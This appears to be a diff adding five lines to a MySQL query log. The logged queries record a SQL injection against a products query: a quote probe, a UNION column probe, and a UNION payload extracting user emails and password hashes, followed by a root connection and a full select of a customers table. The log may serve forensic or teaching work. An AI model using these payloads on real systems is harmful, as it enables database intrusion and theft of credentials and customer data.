@@ -1,0 +1,5 @@
+2026-07-22T01:25:07.120000Z	   208 Query	SELECT id,name,price FROM products WHERE id=1'
+2026-07-22T01:27:20.300000Z	   209 Query	SELECT id,name,price FROM products WHERE id=1 UNION SELECT NULL,NULL,NULL-- 
+2026-07-22T01:31:44.512000Z	   211 Query	SELECT id,name,price FROM products WHERE id=-1 UNION SELECT 1,group_concat(email,0x3a,password_hash),3 FROM users-- 
+2026-07-22T02:15:20.000000Z	   240 Connect	root@localhost on shopdb using Socket
+2026-07-22T02:15:21.200000Z	   240 Query	SELECT /*!40001 SQL_NO_CACHE */ * FROM `customers`
